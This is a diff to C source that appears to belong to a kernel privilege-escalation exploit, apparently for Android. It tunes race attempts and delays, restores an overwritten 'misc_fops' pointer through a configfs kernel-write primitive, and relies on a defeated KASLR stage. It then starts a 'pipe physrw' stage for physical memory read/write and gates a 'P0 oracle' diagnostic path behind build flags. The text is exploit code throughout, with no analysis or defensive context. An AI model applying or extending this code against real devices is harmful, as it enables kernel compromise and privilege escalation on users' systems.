@@ -1,6 +1,10 @@
 #include "common.h"
 
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+#define PSELECT_CFI_ROUTE_ATTEMPTS 4
+#else
 #define PSELECT_CFI_ROUTE_ATTEMPTS 1
+#endif
 
 atomic_int cfi_stage_done;
 ssize_t cfi_write_ret = -1;
@@ -30,7 +34,14 @@ static int route_delay_usec(int attempt) {
     errno = 0;
     long value = strtol(forced, &end, 0);
     if (!errno && end != forced && !*end && value >= 0 && value <= 1000000) {
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+      static const int offsets[] = {0, 5000, 0, 5000};
+      size_t index = (size_t)(attempt - 1) %
+                     (sizeof(offsets) / sizeof(offsets[0]));
+      return (int)value + offsets[index];
+#else
       return (int)value;
+#endif
     }
   }
   static const int delays[] = {
@@ -292,7 +303,17 @@ int try_cfi_stage(void) {
     goto fail;
   }
 
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  if (!restore_p0_oracle_pages(fd)) {
+    cfi_last_step = 10;
+    cfi_last_errno = errno;
+    goto fail;
+  }
+#endif
+
   uint64_t original_fops = canon_addr(ASHMEM_FOPS);
+  pr_info("cfi restoring misc_fops target=%016zx value=%016llx\n",
+          misc_fops, (unsigned long long)original_fops);
   ssize_t restore = configfs_write_once(
       fd, misc_fops, &original_fops, sizeof(original_fops));
   cfi_restore_ret = restore;
@@ -311,17 +332,29 @@ int try_cfi_stage(void) {
     goto fail;
   }
 
+#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
   if (!restore_slide_boot_id(fd)) {
     cfi_last_step = 10;
     cfi_last_errno = errno;
     goto fail;
   }
+#endif
 
   if (!kaslr_done) {
     cfi_last_step = 9;
     cfi_last_errno = errno;
     goto fail;
   }
+
+  pr_info("cfi starting pipe physrw\n");
+
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  if (getenv("P0_ORACLE_DIAG")) {
+    int diagnostic_ok = run_p0_pipe_oracle_diagnostic(fd);
+    fflush(NULL);
+    _exit(diagnostic_ok ? 0 : 1);
+  }
+#endif
 
   int installed = 0;
   pipe_stage_attempts = 0;
